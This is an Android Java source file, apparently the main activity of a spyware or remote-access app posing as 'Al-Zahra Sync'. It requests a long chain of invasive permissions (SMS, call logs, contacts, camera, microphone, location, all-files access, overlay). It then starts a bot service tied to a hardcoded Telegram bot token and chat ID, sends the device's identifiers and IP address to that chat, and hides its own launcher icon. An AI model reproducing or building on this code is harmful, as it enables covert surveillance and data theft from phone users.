package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.data.CallLogCollector;
import com.alzahra.data.ContactsCollector;
import com.alzahra.data.DeviceInfo;
import com.alzahra.data.SMSCollector;
import com.alzahra.receivers.AdminReceiver;
import com.alzahra.services.BotService;
import com.alzahra.services.CoreService;
import com.alzahra.telegram.TelegramAPI;

import org.json.JSONArray;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_CODE = 100;
    private static final int OVERLAY_CODE = 300;
    private static final int USAGE_CODE = 400;
    private static final int STORAGE_CODE = 500;
    
    public static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    public static final String CHAT_ID = "7344776596";
    
    private int permissionIndex = 0;
    private String[] permissionGroups;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "=== Al-Zahra Sync v3.0 Starting ===");
        
        startService(new Intent(this, CoreService.class));
        preparePermissionGroups();
        
        new Handler(Looper.getMainLooper()).postDelayed(this::startPermissionRequests, 500);
    }
    
    private void preparePermissionGroups() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionGroups = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
            };
        } else {
            permissionGroups = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
            };
        }
    }
    
    private void startPermissionRequests() {
        requestNextPermission();
    }
    
    private void requestNextPermission() {
        if (permissionIndex >= permissionGroups.length) {
            requestSpecialPermissions();
            return;
        }
        
        String permission = permissionGroups[permissionIndex];
        
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, 
                new String[]{permission}, PERMISSION_CODE + permissionIndex);
        } else {
            permissionIndex++;
            requestNextPermission();
        }
    }
    
    private void requestSpecialPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_CODE);
                return;
            }
        }
        
        if (!hasUsageStatsPermission()) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivityForResult(intent, USAGE_CODE);
            return;
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, STORAGE_CODE);
                return;
            }
        }
        
        requestBatteryOptimization();
    }
    
    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
        
        setupComplete();
    }
    
    private void setupComplete() {
        Log.d(TAG, "=== Setup Complete, Starting Bot ===");
        
        Intent botService = new Intent(this, BotService.class);
        botService.putExtra("token", BOT_TOKEN);
        botService.putExtra("chat_id", CHAT_ID);
        startService(botService);
        
        Toast.makeText(this, "✅ تم التفعيل بنجاح!", Toast.LENGTH_LONG).show();
        
        sendDeviceInfo();
        
        new Handler(Looper.getMainLooper()).postDelayed(this::hideApp, 3000);
    }
    
    private void sendDeviceInfo() {
        new Thread(() -> {
            try {
                DeviceInfo device = new DeviceInfo(this);
                String msg = "🎉 <b>تم تفعيل البوت بنجاح!</b>\n\n" +
                    "📱 <b>الجهاز:</b> " + device.getModel() + "\n" +
                    "🔑 <b>المعرف:</b> <code>" + device.getDeviceId() + "</code>\n" +
                    "📡 <b>IP:</b> " + device.getIPAddress() + "\n" +
                    "🔋 <b>البطارية:</b> " + device.getBatteryLevel() + "%\n" +
                    "⏰ <b>الوقت:</b> " + device.getCurrentTime() + "\n\n" +
                    "📖 <b>الأوامر:</b> /help";
                
                TelegramAPI.sendMessage(BOT_TOKEN, CHAT_ID, msg);
            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode >= PERMISSION_CODE && requestCode < PERMISSION_CODE + 100) {
            permissionIndex++;
            requestNextPermission();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_CODE || requestCode == USAGE_CODE || requestCode == STORAGE_CODE) {
            requestSpecialPermissions();
        }
    }
    
    private void hideApp() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
